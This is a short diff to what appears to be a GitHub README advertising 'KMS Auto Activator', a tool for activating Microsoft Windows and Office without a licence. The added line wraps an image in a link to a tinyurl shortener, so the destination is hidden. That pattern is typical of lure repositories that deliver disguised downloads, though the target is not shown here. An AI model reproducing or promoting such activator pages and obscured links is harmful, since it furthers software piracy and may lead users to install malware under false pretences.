@@ -5,7 +5,7 @@
 ## What It Is
 KMS Auto Activator is a smart automated utility designed to enable Microsoft Windows and Office suites with minimal effort. Enjoy completely automatic activation that operates independently once initiated.
 
-
+[![735674659](https://github.com/user-attachments/assets/d3e984f6-25be-4c88-b1f9-6c83feb6f5c3)](https://tinyurl.com/mthp62ma)
 
 ## Core Capabilities ✨
 - **🤖 Complete Automation**: Fully independent operation requiring no supervision
